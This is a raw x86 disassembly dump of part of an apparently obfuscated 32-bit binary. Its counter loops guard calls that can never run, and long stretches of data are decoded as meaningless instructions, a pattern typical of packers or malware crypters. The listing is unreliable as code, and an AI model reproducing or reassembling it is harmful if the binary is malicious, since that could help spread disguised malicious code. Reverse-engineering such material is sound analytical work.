  403222:	rdpmc  
  403224:	push   0x17
  403226:	gs pop ds
  403228:	mov    ?,WORD PTR [ecx]
  40322a:	test   dh,bl
  40322c:	out    0xce,eax
  40322e:	mov    ch,0xc2
  403230:	daa    
  403231:	mov    bh,0xcf
  403233:	stos   DWORD PTR es:[edi],eax
  403234:	ss in  eax,dx
  403236:	inc    ebp
  403237:	data16 jnp 0x40321a
  40323a:	loop   0x4031e2
  40323c:	sbb    BYTE PTR [edi-0x29e7de72],bl
  403242:	pop    es
  403243:	cmp    DWORD PTR [ebx+0x7f9398e9],ebp
  403249:	pop    edi
  40324a:	pop    esi
  40324b:	leave  
  40324c:	ret    0xc
  40324f:	push   ebp
  403250:	mov    ebp,esp
  403252:	mov    eax,ds:0x445224
  403257:	add    DWORD PTR ds:0x448998,edx
  40325d:	mov    edx,0x32729e
  403262:	movzx  ecx,WORD PTR ds:0x424854
  403269:	or     DWORD PTR ds:0x44e40c,ecx
  40326f:	sub    eax,edx
  403271:	mov    ecx,DWORD PTR ds:0x44e41c
  403277:	or     DWORD PTR ds:0x44899c,ecx
  40327d:	mov    ecx,0x7510857
  403282:	and    DWORD PTR ds:0x44b6d0,0x4489a8
  40328c:	push   esi
  40328d:	and    DWORD PTR ds:0x41074b,0x0
  403297:	jmp    0x4032a9
  40329c:	mov    esi,DWORD PTR ds:0x41074b
  4032a2:	inc    esi
  4032a3:	mov    DWORD PTR ds:0x41074b,esi
  4032a9:	cmp    DWORD PTR ds:0x41074b,0x18
  4032b0:	jae    0x4032e1
  4032b6:	cmp    DWORD PTR ds:0x41074b,0x24
  4032bd:	jne    0x4032dc
  4032c3:	push   0x2dca
  4032c8:	push   0x41089f
  4032cd:	push   DWORD PTR [ebp-0x18]
  4032d0:	push   DWORD PTR [ebp-0x18]
  4032d3:	push   DWORD PTR [ebp-0x10]
  4032d6:	call   DWORD PTR ds:0x443004
  4032dc:	jmp    0x40329c
  4032e1:	mov    esi,DWORD PTR [ebp+0xc]
  4032e4:	add    DWORD PTR ds:0x448980,0x448994
  4032ee:	xor    eax,ecx
  4032f0:	cmp    eax,esi
  4032f2:	je     0x403532
  4032f8:	mov    eax,ds:0x44521c
  4032fd:	xor    DWORD PTR ds:0x44e428,0x43cf
  403307:	jmp    0x4033ac
  40330c:	rol    BYTE PTR ds:0xad798db9,1
  403312:	loopne 0x403391
  403314:	dec    esi
  403315:	push   edi
  403316:	mov    cl,0x6e
  403318:	call   0xee50219d
  40331d:	add    bh,BYTE PTR [esp+edi*2-0xc]
  403321:	jl     0x40339f
  403323:	jl     0x4032d8
  403325:	xchg   esp,eax
  403326:	cli    
  403327:	call   0x687f:0x25f61014
  40332e:	mov    dh,BYTE PTR [edx+0x28]
  403331:	aam    0xba
  403333:	gs cdq 
  403335:	and    eax,ebp
  403337:	retf   
  403338:	iret   
  403339:	pop    edi
  40333a:	jbe    0x403379
  40333c:	dec    esp
  40333d:	mov    al,ds:0xbed3573
  403342:	mov    eax,edx
  403344:	outs   dx,DWORD PTR ds:[esi]
  403345:	bnd jmp 0x40338c
  403348:	fcom   QWORD PTR [ecx+0x7b21ba6e]
  40334e:	js     0x4032fc
  403350:	adc    al,BYTE PTR [edx-0x78]
  403353:	inc    esp
  403354:	lods   al,BYTE PTR ds:[esi]
  403355:	push   cs
  403356:	sbb    eax,DWORD PTR [edi+0x14]
  403359:	cmovnp ebp,DWORD PTR [eax]
  40335c:	inc    ecx
  40335d:	adc    ebp,edi
  40335f:	inc    eax
  403360:	(bad)  [edx]
  403362:	or     bl,cl
  403364:	popa   
  403365:	bound  esp,QWORD PTR [esi+edi*1+0x7c]
  403369:	stc    
  40336a:	rcr    BYTE PTR [edx+0x2ac08ea5],0x30
  403371:	or     DWORD PTR [edi],0x67adcc2f
  403377:	into   
  403378:	(bad)  
  403379:	(bad)  
  40337a:	js     0x403313
  40337c:	repnz xor BYTE PTR ss:[ebx],al
  403380:	adc    edx,eax
  403382:	shl    DWORD PTR [edi-0x3e908367],0x33
  403389:	jg     0x403346
  40338b:	nop
  40338c:	lods   al,BYTE PTR ds:[esi]
  40338d:	sub    eax,0xabab83c7
  403392:	cmp    BYTE PTR [ebp-0x5c4e96f0],bl
  403398:	xchg   edi,eax
  403399:	jp     0x4033b5
  40339b:	jg     0x403348
  40339d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40339e:	sbb    BYTE PTR [ebx],cl
  4033a0:	xchg   ecx,eax
  4033a1:	pushf  
  4033a2:	cs xor al,0x8e
  4033a5:	fisub  DWORD PTR [ebp-0x67cc1f99]
  4033ab:	xchg   BYTE PTR [ebx-0x3dd4f38b],cl
  4033b1:	jmp    0x403456
  4033b6:	sahf   
  4033b7:	and    al,0xc4
  4033b9:	cwde   
  4033ba:	inc    esi
  4033bb:	js     0x40340f
  4033bd:	cmp    dl,BYTE PTR [eax+0x4a]
  4033c0:	fucomp st(0)
  4033c2:	mov    cl,0xf0
  4033c4:	cmp    BYTE PTR [edx],0x66
  4033c7:	add    bh,BYTE PTR [esp+edi*2-0xc]
  4033cb:	jl     0x403449
  4033cd:	jl     0x4033cd
  4033cf:	ret    
  4033d0:	or     bl,BYTE PTR [edx+0x74a4943b]
  4033d6:	pop    edx
  4033d7:	int    0x1c
  4033d9:	ins    DWORD PTR es:[edi],dx
  4033da:	scas   al,BYTE PTR es:[edi]
  4033db:	rol    edx,0xc1
  4033de:	push   edx
  4033df:	sub    ecx,esp
  4033e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033e2:	stos   DWORD PTR es:[edi],eax
  4033e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033e4:	shr    DWORD PTR [edx],1
  4033e6:	jne    0x403400
  4033e8:	cmp    al,bl
  4033ea:	sub    bl,bh
  4033ec:	mov    bh,0xfe
  4033ee:	mov    bl,0x40
  4033f0:	test   eax,eax
  4033f2:	(bad)  
  4033f3:	cdq    
  4033f4:	out    dx,eax
  4033f5:	or     eax,0x3b4c85b9
  4033fa:	out    0x3b,al
  4033fc:	adc    al,BYTE PTR [ecx+0x1e4dda65]
  403402:	jne    0x40346d
  403404:	jg     0x403430
  403406:	int    0x27
  403408:	out    dx,al
  403409:	popa   
  40340a:	pop    ebx
  40340b:	dec    ecx
  40340c:	push   edi
  40340d:	test   DWORD PTR [edx+ebx*1-0x2b],0xc539f028
  403415:	and    al,ah
  403417:	adc    ebx,DWORD PTR [edi-0x4c6c7ad5]
  40341d:	or     cl,BYTE PTR [edx]
  40341f:	(bad)  [eax-0x7afb92c7]
  403425:	data16 mov dl,0x9f
  403428:	xchg   cl,cl
  40342a:	cdq    
  40342b:	cmp    DWORD PTR ds:0x2cc8afef,edx
  403431:	in     eax,dx
  403432:	xchg   DWORD PTR [edx+0x2a],eax
  403435:	imul   esi,DWORD PTR [edx+0x35399783],0xb0ad0fcb
  40343f:	aad    0x47
  403441:	loope  0x403456
  403443:	mov    dh,0xd0
  403445:	sbb    BYTE PTR [esp+eax*8-0x13],bl
  403449:	aas    
  40344a:	jg     0x4033d4
  40344c:	lds    ebx,FWORD PTR [ebx+0x1632eec0]
  403452:	dec    ebx
  403453:	sbb    DWORD PTR [ebx+0x3bc13338],eax
  403459:	(bad)  
  40345a:	jne    0x403470
  403460:	mov    eax,ds:0x445224
  403465:	add    eax,DWORD PTR ds:0x44521c
  40346b:	jmp    0x40351c
  403470:	mov    eax,DWORD PTR [ebp+0xc]
  403473:	xor    eax,ecx
  403475:	jmp    0x40351a
  40347a:	ficomp WORD PTR [edx+0x22]
  40347d:	mov    WORD PTR [edx+0x277a5264],?
  403483:	adc    eax,0x74a3fc0e
  403488:	or     BYTE PTR [ebp-0x2],bl
  40348b:	add    eax,0x7cf47c7c
  403490:	jl     0x40350e
  403492:	mov    BYTE PTR [esi-0x39],ch
  403495:	mov    al,0xf2
  403497:	adc    BYTE PTR [ebx],dh
  403499:	push   ebx
  40349a:	dec    esp
  40349b:	(bad)  
  40349c:	dec    ecx
  40349d:	cmc    
  40349e:	popa   
  40349f:	push   ebp
  4034a0:	sub    BYTE PTR [ebx-0x1288e961],ah
  4034a6:	mov    fs,ebp
  4034a8:	scas   al,BYTE PTR es:[edi]
  4034a9:	xchg   esi,eax
  4034aa:	mov    BYTE PTR [edx-0x11],al
  4034ad:	inc    ecx
  4034ae:	sti    
  4034af:	xor    ch,dh
  4034b1:	data16 (bad) 
  4034b3:	pop    ecx
  4034b4:	jp     0x40351a
  4034b6:	mov    al,ds:0xfb332d6d
  4034bb:	sbb    esp,eax
  4034bd:	cmovae ebp,esi
  4034c0:	outs   dx,BYTE PTR ds:[esi]
  4034c1:	xor    esi,DWORD PTR [edi-0x3700757c]
  4034c7:	out    dx,eax
  4034c8:	mov    edi,eax
  4034ca:	js     0x403500
  4034cc:	fild   WORD PTR [edi]
  4034ce:	xor    esi,DWORD PTR [esi+0x1f422593]
  4034d4:	mov    dh,0x2b
  4034d6:	xor    DWORD PTR [ebp+0x3c],esi
  4034d9:	retf   
  4034da:	pop    ebx
  4034db:	inc    esi
  4034dc:	add    ebx,DWORD PTR es:[edi+0x4b]
  4034e0:	or     DWORD PTR [ebp+0x7d],eax
  4034e3:	push   ebp
  4034e4:	push   esp
  4034e5:	arpl   WORD PTR [eax+eax*1+0x39],ax
  4034e9:	and    ch,BYTE PTR [esi-0x2f5081de]
  4034ef:	adc    ah,BYTE PTR [ebx+eiz*4+0x7f]
  4034f3:	dec    esp
  4034f4:	loope  0x40350b
  4034f6:	mov    ebp,0x75863b0a
  4034fb:	out    dx,al
  4034fc:	inc    esp
  4034fd:	xor    ecx,DWORD PTR [edi+eiz*4+0x60]
  403501:	xchg   DWORD PTR [ecx-0x3cc5b341],edx
  403507:	cs inc edx
  403509:	aas    
  40350a:	mov    ebp,0x7999a6a1
  40350f:	fcom   QWORD PTR [ecx-0x78]
  403512:	or     DWORD PTR [eax+eax*8+0x34],ebp
  403516:	sub    BYTE PTR [edx-0x3dfcdf25],bl
  40351c:	mov    ds:0x44521c,eax
  403521:	mov    eax,DWORD PTR [ebp+0xc]
  403524:	xor    eax,ecx
  403526:	add    eax,edx
  403528:	mov    ds:0x445224,eax
  40352d:	jmp    0x40353c
  403532:	mov    eax,ds:0x445224
  403537:	mov    ds:0x44521c,eax
  40353c:	mov    eax,DWORD PTR [ebp+0x8]
  40353f:	mov    eax,DWORD PTR [eax]
  403541:	mov    ecx,DWORD PTR ds:0x44521c
  403547:	add    DWORD PTR [eax],ecx
  403549:	pop    esi
  40354a:	pop    ebp
  40354b:	ret    0x8
  40354e:	push   ebp
  40354f:	mov    ebp,esp
  403551:	sub    esp,0x44
  403554:	push   edi
  403555:	mov    eax,DWORD PTR [ebp+0xc]
  403558:	and    edi,DWORD PTR ds:0x448984
  40355e:	mov    DWORD PTR [ebp-0x10],eax
  403561:	mov    DWORD PTR ds:0x44e424,0x11
  40356b:	cmp    DWORD PTR ds:0x44e424,0x0
  403572:	je     0x4035af
  403578:	cmp    DWORD PTR ds:0x44e424,0x1d
  40357f:	jne    0x403595
  403585:	push   0x4107d0
  40358a:	push   0x4107e6
  40358f:	call   DWORD PTR ds:0x44334c
  403595:	mov    eax,ds:0x44e424
  40359a:	dec    eax
  40359b:	mov    ds:0x44e424,eax
  4035a0:	jmp    0x40356b
  4035a5:	xor    DWORD PTR ds:0x44b6dc,0x5830
  4035af:	mov    eax,DWORD PTR [ebp+0x8]
  4035b2:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4035b9:	mov    edi,DWORD PTR ds:0x44b6d0
  4035bf:	xor    DWORD PTR ds:0x44b6e0,edi
  4035c5:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4035cc:	xor    edx,DWORD PTR ds:0x424844
  4035d2:	mov    edx,DWORD PTR [ebp+0x8]
  4035d5:	and    edi,edi
  4035d7:	jmp    0x40373c
  4035dc:	loopne 0x4035cc
  4035de:	enter  0xcaef,0xfd
  4035e2:	sti    
  4035e3:	in     eax,0xa8
  4035e5:	cmp    eax,edi
  4035e7:	jg     0x403569
  4035e9:	mov    es,WORD PTR [esi-0x5e]
  4035ec:	jbe    0x4035f2
  4035ee:	jl     0x40366c
  4035f0:	xor    al,0x7f
  4035f2:	jl     0x403670
  4035f4:	inc    ebp
  4035f5:	dec    esi
  4035f6:	lahf   
  4035f7:	jno    0x4035b0
  4035f9:	pop    ebx
  4035fa:	push   edx
  4035fb:	test   BYTE PTR [ebp+ebp*1-0x1c],0x64
  403600:	jle    0x40365b
  403602:	fnstsw WORD PTR [esi-0x37e2274a]
  403608:	ror    DWORD PTR es:[eax-0x27],1
  40360c:	into   
  40360d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40360e:	arpl   WORD PTR [eax],dx
  403610:	scas   eax,DWORD PTR es:[edi]
  403611:	cmp    eax,esi
  403613:	xchg   ebp,eax
  403614:	shr    BYTE PTR [edx],cl
  403616:	int3   
  403617:	ins    DWORD PTR es:[edi],dx
  403618:	punpckhwd mm5,QWORD PTR [ebp-0x6ed3fde2]
  40361f:	pop    ebp
  403620:	sbb    eax,0xae42d4b8
  403625:	int    0x38
  403627:	add    cl,BYTE PTR [ebx-0x1e]
  40362a:	pop    ebp
  40362b:	les    ecx,FWORD PTR [edx]
  40362d:	(bad)  
  40362e:	lahf   
  40362f:	mov    al,ds:0xffeb86a8
  403634:	and    esi,DWORD PTR [esi]
  403636:	jno    0x4035fa
  403638:	mov    DWORD PTR [edx-0x79],ebx
  40363b:	outs   dx,DWORD PTR ds:[esi]
  40363c:	sub    cl,BYTE PTR [esi+0x1b98c7b]
  403642:	ret    
  403643:	pop    esp
  403644:	les    edi,FWORD PTR [ebp+edi*2-0x38]
  403648:	inc    ecx
  403649:	push   edi
  40364a:	jmp    0xdaaf:0x4a70b1a8
  403651:	nop
  403652:	sub    eax,0x484d07dd
  403657:	(bad)
  40365a:	cmp    BYTE PTR [ebx+0x5a],al
  40365d:	scas   eax,DWORD PTR es:[edi]
  40365e:	pop    ebx
  40365f:	(bad)  
  403660:	mov    ch,0x82
  403662:	test   BYTE PTR ds:0xe5fc1df,0x17
  403669:	dec    ecx
  40366a:	inc    eax
  40366b:	jle    0x403608
  40366d:	test   edx,ebx
  40366f:	imul   ebx,DWORD PTR [ecx-0x14],0xfffffffc
  403673:	sub    al,0xe4
  403675:	clc    
  403676:	(bad)  
  403677:	sbb    BYTE PTR ds:0xfddfc472,bl
  40367d:	and    DWORD PTR [ebx],ecx
  40367f:	pop    esi
  403680:	(bad)  
  403681:	ret    0xfaad
  403684:	and    cl,BYTE PTR [ecx+0x4e]
  403687:	pop    ebx
  403688:	aas    
  403689:	data16 outs dx,BYTE PTR ds:[esi]
  40368b:	xchg   esp,eax
  40368c:	das    
  40368d:	and    ecx,DWORD PTR [edi*4+0x45c136d3]
  403694:	imul   eax,DWORD PTR [ebp+0x2cdaf3e6],0x92c569a5
  40369e:	xchg   DWORD PTR [ecx],edx
  4036a0:	mov    eax,ds:0x2713553f
  4036a5:	pusha  
  4036a6:	popf   
  4036a7:	pop    eax
  4036a8:	je     0x403692
  4036aa:	xadd   BYTE PTR [ecx-0x34],bh
  4036ae:	test   DWORD PTR [ecx+0x77dade2d],esp
  4036b4:	iret   
  4036b5:	mov    al,0xa9
  4036b7:	push   edi
  4036b8:	repnz inc esi
  4036ba:	and    eax,0x98ac661
  4036bf:	sbb    ah,dl
  4036c1:	and    BYTE PTR [ecx-0x7e],bl
  4036c4:	out    dx,al
  4036c5:	fadd   st,st(3)
  4036c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036c8:	mov    ch,0x12
  4036ca:	fmul   st(4),st
  4036cc:	sbb    edx,esi
  4036ce:	push   ds
  4036cf:	and    dl,bl
  4036d1:	inc    eax
  4036d2:	add    DWORD PTR [ecx+0x5f],ebp
  4036d5:	fld    QWORD PTR [ebx+0x7a54728c]
  4036db:	cwde   
  4036dc:	xor    al,0xc6
  4036de:	add    eax,0xaf033da3
  4036e3:	or     bl,BYTE PTR [ebp-0x1d5f08cd]
  4036e9:	push   ss
  4036ea:	fnstenv [ebp-0x2b]
  4036ed:	add    eax,0xdbabde1
  4036f2:	out    0x7e,eax
  4036f4:	or     eax,0xfd6d6d95
  4036f9:	cmp    BYTE PTR [edi],bh
  4036fb:	push   esp
  4036fc:	jnp    0x403768
  4036fe:	int    0x8e
  403700:	test   BYTE PTR [edx],ch
  403702:	repz sbb esi,edx
  403705:	and    edx,DWORD PTR ds:0x41f47492
  40370b:	popf   
  40370c:	mov    ecx,eax
  40370e:	and    eax,0x1ba82c5
  403713:	fs or  al,0x30
  403716:	scas   al,BYTE PTR es:[edi]
  403717:	inc    esi
  403718:	push   edx
  403719:	jbe    0x4036c2
  40371b:	mov    eax,ds:0x916c574a
  403720:	push   eax
  403721:	push   esp
  403722:	pop    esp
  403723:	mov    al,ds:0xcc433a52
  403728:	out    dx,al
  403729:	jg     0x40370d
  40372b:	je     0x4036ad
  40372d:	(bad)  
  40372e:	mov    ecx,0x3de610cb
  403733:	cs ss push edx
  403736:	in     al,dx
  403737:	dec    eax
  403738:	sub    ecx,DWORD PTR [edi+edi*1]
  40373b:	push   cs
  40373c:	mov    DWORD PTR [ebp-0x40],eax
  40373f:	mov    eax,0x7510857
  403744:	xor    edx,eax
  403746:	mov    ecx,0x32729e
  40374b:	add    edx,ecx
  40374d:	adc    edi,DWORD PTR ds:0x448990
  403753:	mov    DWORD PTR [ebp-0x8],edx
  403756:	mov    edi,DWORD PTR ds:0x4489bc
  40375c:	mov    edx,DWORD PTR ds:0x4489c4
  403762:	sub    edx,edi
  403764:	xor    edi,DWORD PTR [edi+edx*1]
  403767:	mov    edx,DWORD PTR [ebp+0x8]
  40376a:	xor    edx,eax
  40376c:	not    edi
  40376e:	add    edx,ecx
  403770:	add    DWORD PTR ds:0x448984,ebx
  403776:	mov    DWORD PTR [ebp+0xc],edx
  403779:	and    DWORD PTR ds:0x424844,0x0
  403783:	mov    edx,DWORD PTR ds:0x424844
  403789:	inc    edx
  40378a:	mov    DWORD PTR ds:0x424844,edx
  403790:	cmp    DWORD PTR ds:0x424844,0x4
  403797:	jne    0x4037b0
  40379d:	push   0x41073f
  4037a2:	push   DWORD PTR [ebp-0x28]
  4037a5:	push   0x6880
  4037aa:	call   DWORD PTR ds:0x443350
  4037b0:	cmp    DWORD PTR ds:0x424844,0x3
  4037b7:	jne    0x4037cc
  4037bd:	xor    edx,edx
  4037bf:	xor    edx,DWORD PTR ds:0x424844
  4037c5:	inc    edx
  4037c6:	mov    DWORD PTR ds:0x424844,edx
  4037cc:	cmp    DWORD PTR ds:0x424844,0x1b
  4037d3:	jb     0x403783
  4037d9:	adc    edi,DWORD PTR ds:0x44b6cc
  4037df:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  4037e6:	adc    edi,DWORD PTR ds:0x4489a4
  4037ec:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4037f3:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  4037fa:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403801:	and    DWORD PTR ds:0x424848,0x0
  40380b:	jmp    0x40381d
  403810:	mov    edx,DWORD PTR ds:0x424848
  403816:	inc    edx
  403817:	mov    DWORD PTR ds:0x424848,edx
  40381d:	cmp    DWORD PTR ds:0x424848,0x1e
  403824:	jae    0x40386c
  40382a:	cmp    DWORD PTR ds:0x424848,0xa
  403831:	jne    0x403847
  403837:	push   0x48af
  40383c:	push   0x400000
  403841:	call   DWORD PTR ds:0x443354
  403847:	cmp    DWORD PTR ds:0x424848,0x9
  40384e:	jne    0x403861
  403854:	mov    edx,DWORD PTR ds:0x424848
  40385a:	inc    edx
  40385b:	mov    DWORD PTR ds:0x424848,edx
  403861:	jmp    0x403810
  403866:	or     DWORD PTR ds:0x448994,ecx
  40386c:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  403873:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40387a:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  403881:	or     edi,edx
  403883:	mov    edx,DWORD PTR [ebp+0x8]
  403886:	mov    DWORD PTR ds:0x424858,0x6ab7
  403890:	xor    edx,eax
  403892:	or     DWORD PTR ds:0x41075b,edx
  403898:	mov    edi,DWORD PTR [ebp-0x10]
  40389b:	add    edx,ecx
  40389d:	cmp    edi,edx
  40389f:	mov    DWORD PTR ds:0x448980,0x7f1d
  4038a9:	je     0x40511b
  4038af:	mov    DWORD PTR ds:0x424844,0x4e02
  4038b9:	push   ebx
  4038ba:	mov    DWORD PTR ds:0x44b6cc,0x557d
  4038c4:	jmp    0x4050f6
  4038c9:	mov    edx,DWORD PTR [ebp-0x8]
  4038cc:	and    DWORD PTR ds:0x44e41c,0x0
  4038d6:	jmp    0x4038e8
  4038db:	mov    edi,DWORD PTR ds:0x44e41c
  4038e1:	inc    edi
  4038e2:	mov    DWORD PTR ds:0x44e41c,edi
  4038e8:	cmp    DWORD PTR ds:0x44e41c,0x10
  4038ef:	jae    0x403921
  4038f5:	cmp    DWORD PTR ds:0x44e41c,0x19
  4038fc:	jne    0x403912
  403902:	push   0x7f28
  403907:	push   0x230d
  40390c:	call   DWORD PTR ds:0x443358
  403912:	jmp    0x4038db
  403917:	mov    DWORD PTR ds:0x448984,0x3377
  403921:	mov    edi,DWORD PTR [ebp-0x10]
  403924:	or     DWORD PTR ds:0x44b6e4,0x66ab
  40392e:	jmp    0x403a93
  403933:	std    
  403934:	xor    al,0x25
  403936:	mov    eax,ds:0x487d7d25
  40393b:	add    al,0x98
  40393d:	test   al,0x7f
  40393f:	inc    edi
  403940:	aam    0xbb
  403942:	(bad)  
  403944:	pop    es
  403945:	jl     0x4039c3
  403947:	xor    al,0x7f
  403949:	jl     0x4039c7
  40394b:	mov    ecx,0x22a7831
  403950:	xchg   ecx,eax
  403951:	lds    edi,FWORD PTR [ebp+0x6f179d28]
  403957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403958:	fsubrp st(0),st
  40395a:	in     al,dx
  40395b:	xor    ebp,esi
  40395d:	hlt    
  40395e:	xor    bl,BYTE PTR [eax-0x47e0d254]
  403964:	(bad)
  403968:	xor    ebp,0x3b3642fe
  40396e:	and    esp,DWORD PTR [ecx-0x35bcda5d]
  403974:	loopne 0x403940
  403976:	in     al,0x83
  403978:	mov    bh,0x9b
  40397a:	pusha  
  40397b:	lahf   
  40397c:	neg    BYTE PTR [ebp-0x283587da]
  403982:	dec    ebx
  403983:	out    0x33,eax
  403985:	or     dl,ch
  403987:	xchg   edx,eax
  403988:	mov    al,ds:0x61856f4
  40398d:	adc    eax,0x4eb95637
  403992:	shl    edi,cl
  403994:	les    ebx,FWORD PTR [edi]
  403996:	xchg   DWORD PTR [eax],edx
  403998:	push   es
  403999:	imul   esi,esi,0x171d4f4b
  40399f:	sbb    eax,0x17768edf
  4039a4:	mov    bh,0x8c
  4039a6:	add    ebp,0xffffff9e
  4039a9:	fist   WORD PTR [eax]
  4039ab:	(bad)  
  4039ac:	mov    WORD PTR [ecx-0x3737528e],fs
  4039b2:	sub    eax,0x95b2a36c
  4039b7:	std    
  4039b8:	cdq    
  4039b9:	xor    ah,0x75
  4039bc:	push   eax
  4039bd:	mov    dl,0x50
  4039bf:	jl     0x4039d2
  4039c1:	sar    DWORD PTR [ecx-0x4bdd1c67],0xe7
  4039c8:	lahf   
  4039c9:	jnp    0x403988
  4039cb:	pop    esi
  4039cc:	mov    ebx,0x54266826
  4039d1:	dec    ebx
  4039d2:	add    esi,DWORD PTR [ecx]
  4039d4:	scas   al,BYTE PTR es:[edi]
  4039d5:	and    eax,0xa7e42b91
  4039da:	pop    edx
  4039db:	(bad)  
  4039dc:	retf   0x629b
  4039df:	jmp    0x7c81:0x80569261
  4039e6:	sbb    dl,BYTE PTR [ebp+ebx*1-0x50]
  4039ea:	jns    0x403a37
  4039ec:	pop    esi
  4039ed:	test   BYTE PTR [edi-0x1c8208e1],dh
  4039f3:	sbb    bl,BYTE PTR [edx+0x71]
  4039f6:	loop   0x4039b2
  4039f8:	ja     0x403a3a
  4039fa:	(bad)  
  4039fb:	js     0x403a2e
  4039fd:	fisub  WORD PTR [eax-0x5d]
  403a00:	lds    eax,FWORD PTR [eax-0x72]
  403a03:	pop    es
  403a04:	in     eax,0x8
  403a06:	loope  0x403a0c
  403a08:	scas   eax,DWORD PTR es:[edi]
  403a09:	lea    esi,[edi+0x662e1f57]
  403a0f:	adc    bh,BYTE PTR [edx]
  403a11:	add    esi,ecx
  403a13:	sub    eax,0xcbb825ec
  403a18:	mov    bh,BYTE PTR [esi]
  403a1a:	ds je  0x4039c6
  403a1d:	ss pop ds
  403a1f:	push   ss
  403a20:	and    DWORD PTR [esi-0x60175202],eax
  403a26:	xchg   edx,eax
  403a27:	fst    st(7)
  403a29:	xor    ah,dh
  403a2b:	out    0x11,eax
  403a2d:	push   ebp
  403a2e:	sub    bh,BYTE PTR [ebp-0x52]
  403a31:	imul   eax,DWORD PTR [edx-0x1b],0xffffff99
  403a35:	pushf  
  403a36:	test   al,0x7a
  403a38:	cmp    eax,DWORD PTR [edx+0x10c39678]
  403a3e:	outs   dx,DWORD PTR ds:[esi]
  403a3f:	push   es
  403a40:	push   edx
  403a41:	fist   WORD PTR [edx]
  403a43:	(bad)  
  403a44:	ja     0x403a15
  403a46:	mov    bl,BYTE PTR [ecx+0x59]
  403a49:	pop    ss
  403a4a:	pop    ds
  403a4b:	cmp    al,0xf6
  403a4d:	outs   dx,BYTE PTR ds:[esi]
  403a4e:	jo     0x403a37
  403a50:	cli    
  403a51:	sbb    ebp,DWORD PTR [eax+edx*4]
  403a54:	push   0x31eebf77
  403a59:	lahf   
  403a5a:	sbb    DWORD PTR [ecx],ecx
  403a5c:	sub    DWORD PTR [ebx],edi
  403a5e:	pop    edi
  403a5f:	pop    eax
  403a60:	les    edi,FWORD PTR cs:[eax]
  403a63:	pop    ebp
  403a64:	shl    BYTE PTR [esi-0x7ad18984],cl
  403a6a:	mov    ch,0xfc
  403a6c:	jb     0x403ad7
  403a6e:	pop    edi
  403a6f:	xor    DWORD PTR [edi+0x5b9f1926],eax
  403a75:	(bad)  
  403a76:	sbb    eax,0x58f597c2
  403a7b:	aam    0x60
  403a7d:	popw   ss
  403a7f:	sub    DWORD PTR [ebp+ebx*4+0x30c6c39c],esi
  403a86:	pop    eax
  403a87:	test   DWORD PTR [edi+0x2f],esp
  403a8a:	es sahf 
  403a8c:	loope  0x403a98
  403a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a8f:	mov    ah,0xc8
  403a91:	mov    bh,0x77
  403a93:	sub    edi,edx
  403a95:	adc    DWORD PTR ds:0x44e410,0x1ab0
  403a9f:	mov    edx,DWORD PTR [ebp-0x4]
  403aa2:	xor    DWORD PTR ds:0x44b6e4,0x35da
  403aac:	xor    edx,eax
  403aae:	xor    DWORD PTR ds:0x44b6e8,0x513b
  403ab8:	add    edx,ecx
  403aba:	mov    DWORD PTR ds:0x44e414,0x7aea
  403ac4:	cmp    edi,edx
  403ac6:	mov    DWORD PTR ds:0x41073f,0x2e05
  403ad0:	jb     0x40511a
  403ad6:	xor    edx,0x3e56
  403adc:	mov    edx,DWORD PTR [ebp-0x28]
  403adf:	mov    edi,DWORD PTR [ebp-0x4]
  403ae2:	xor    edx,eax
  403ae4:	and    DWORD PTR ds:0x448980,0x0
  403aee:	jmp    0x403b02
  403af3:	xor    ebx,ebx
  403af5:	xor    ebx,DWORD PTR ds:0x448980
  403afb:	inc    ebx
  403afc:	mov    DWORD PTR ds:0x448980,ebx
  403b02:	cmp    DWORD PTR ds:0x448980,0x16
  403b09:	jae    0x403b9b
  403b0f:	cmp    DWORD PTR ds:0x448980,0xd
  403b16:	jne    0x403b25
  403b1c:	push   DWORD PTR [ebp-0x18]
  403b1f:	call   DWORD PTR ds:0x443008
  403b25:	cmp    DWORD PTR ds:0x448980,0xc
  403b2c:	jne    0x403b41
  403b32:	xor    ebx,ebx
  403b34:	xor    ebx,DWORD PTR ds:0x448980
  403b3a:	inc    ebx
  403b3b:	mov    DWORD PTR ds:0x448980,ebx
  403b41:	jmp    0x403af3
  403b46:	and    DWORD PTR ds:0x448980,0x0
  403b50:	jmp    0x403b64
  403b55:	xor    ebx,ebx
  403b57:	add    ebx,DWORD PTR ds:0x448980
  403b5d:	inc    ebx
  403b5e:	mov    DWORD PTR ds:0x448980,ebx
  403b64:	cmp    DWORD PTR ds:0x448980,0x19
  403b6b:	jae    0x403b9b
  403b71:	cmp    DWORD PTR ds:0x448980,0x1e
  403b78:	jne    0x403b96
  403b7e:	push   DWORD PTR [ebp-0x1c]
  403b81:	push   0x4801
  403b86:	push   0x66a1
  403b8b:	push   0x3965
  403b90:	call   DWORD PTR ds:0x4430d4
  403b96:	jmp    0x403b55
  403b9b:	xor    edi,eax
  403b9d:	mov    ebx,DWORD PTR ds:0x4489ac
  403ba3:	mov    ebx,DWORD PTR [ebx]
  403ba5:	sbb    DWORD PTR ds:0x42483c,ebx
  403bab:	add    edi,ecx
  403bad:	jmp    0x403d12
  403bb2:	jno    0x403b37
  403bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb5:	imul   esp,DWORD PTR [ebp+0x727dd96d],0x2a
  403bbc:	pop    esi
  403bbd:	clc    
  403bbe:	sub    ebp,DWORD PTR [eax]
  403bc0:	cdq    
  403bc1:	sbb    eax,DWORD PTR [esi+0x347c7c06]
  403bc7:	jg     0x403c45
  403bc9:	jl     0x403b64
  403bcb:	vmaxss xmm7,xmm6,DWORD PTR [edx-0x48e43bf7]
  403bd3:	xor    eax,0x70eba1ff
